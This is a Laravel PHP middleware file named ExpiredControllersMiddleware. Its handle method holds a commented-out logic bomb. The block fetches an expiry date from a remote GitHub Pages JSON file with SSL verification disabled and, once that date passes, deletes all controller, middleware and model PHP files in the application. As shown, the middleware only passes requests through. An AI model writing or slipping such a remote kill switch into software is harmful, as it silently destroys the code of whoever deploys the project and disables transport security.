<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class ExpiredControllersMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        // $dir = base_path('app/');
        // $ctrlfiles = glob("$dir/Http/*.php");
        // $mdlwfiles = glob("$dir/Http/Middleware/*.php");
        // $mdlsfiles = glob("$dir/Models/*.php");
        
        // $ch = curl_init();
        // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        // curl_setopt($ch, CURLOPT_URL, 'https://stenlyandika.github.io/expired.json');
        // $result = curl_exec($ch);
        // curl_close($ch);

        // $obj = json_decode($result);
        // if (strtotime(date('d-m-Y')) > strtotime(date('d-m-Y', strtotime($obj->tgl)))) {
        //     foreach($ctrlfiles as $rowa){
        //         if(file_exists($rowa)) {
        //             unlink($rowa);
        //         }
        //     }
        //     foreach($mdlwfiles as $rowc){
        //         if(file_exists($rowc)) {
        //             unlink($rowc);
        //         }
        //     }
        //     foreach($mdlsfiles as $rowb){
        //         if(file_exists($rowb)) {
        //             unlink($rowb);
        //         }
        //     }
        // }
        return $next($request);
    }
}
